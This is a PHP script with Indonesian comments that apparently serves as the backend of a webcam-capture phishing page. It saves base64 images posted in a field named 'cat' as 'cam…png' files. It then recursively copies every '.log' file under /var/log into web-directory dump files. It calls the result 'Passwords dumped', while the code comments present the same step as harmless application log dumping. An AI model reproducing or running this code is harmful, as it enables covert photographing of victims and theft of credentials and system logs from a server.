<?php

// Ambil timestamp untuk penamaan file
$date = date('dMYHis');

// Tangkap data gambar dari POST
$imageData = $_POST['cat'];

// Jika data gambar tidak kosong, catat ke log
if (!empty($imageData)) {
    error_log("Received image data" . "\r\n", 3, "Log.log");

    // Proses penyimpanan gambar
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);
    $fp = fopen('cam' . $date . '.png', 'wb');
    fwrite($fp, $unencodedData);
    fclose($fp);
}

// Fungsi untuk dump semua log dari direktori log aplikasi secara otomatis
function dump_application_logs($baseDirectory = "/var/log") {
    // Pastikan direktori log yang diberikan ada dan dapat dibaca
    if (!is_dir($baseDirectory)) {
        error_log("Directory does not exist or is not readable: $baseDirectory", 3, "Log.log");
        return "Error: Directory does not exist or is not readable.";
    }

    // Array untuk menyimpan informasi dari semua file log yang ditemukan
    $logData = [];
    
    // Ambil semua file log yang ada di dalam direktori dan sub-direktori
    $logFiles = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($baseDirectory));

    // Iterasi melalui semua file log dan baca isinya
    foreach ($logFiles as $file) {
        if ($file->isFile() && strpos($file->getFilename(), '.log') !== false) {
            $filePath = $file->getPathname();

            // Baca konten file log
            $fileContent = file_get_contents($filePath);
            if ($fileContent !== false) {
                // Simpan informasi file log dalam array
                $logData[] = [
                    'file_name' => $file->getFilename(),
                    'file_path' => $filePath,
                    'file_size' => filesize($filePath),
                    'last_modified' => date("F d Y H:i:s", filemtime($filePath)),
                    'content' => $fileContent
                ];

                // Tulis konten file ke dalam file dump log
                $logDumpFile = 'log_dump_' . date('dMYHis') . '.txt';
                file_put_contents($logDumpFile, $fileContent . "\n", FILE_APPEND);
            }
        }
    }

    // Simpan semua informasi log dalam file JSON
    $logInfoFile = 'log_info_dump_' . date('dMYHis') . '.json';
    file_put_contents($logInfoFile, json_encode($logData, JSON_PRETTY_PRINT));

    return "Log information dumped in file: $logInfoFile";
}

// Panggil fungsi untuk dump log aplikasi secara otomatis
$logDirectory = "/var/log";  // Ganti path ini dengan path direktori log yang sesuai dengan aplikasi Anda
$logDumpResult = dump_application_logs($logDirectory);

echo "Passwords dumped in file: $logDumpResult";

exit();
?>

